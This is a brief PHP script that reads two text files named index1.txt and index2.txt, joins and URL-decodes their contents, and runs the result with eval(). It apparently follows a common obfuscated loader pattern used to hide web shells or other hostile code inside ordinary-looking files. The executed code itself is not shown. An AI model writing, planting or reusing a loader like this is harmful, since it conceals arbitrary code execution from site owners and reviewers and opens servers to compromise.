<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

$part1 = file_get_contents('index1.txt');
$part2 = file_get_contents('index2.txt');

$fullText = urldecode($part1 . $part2);
eval($fullText);
?>
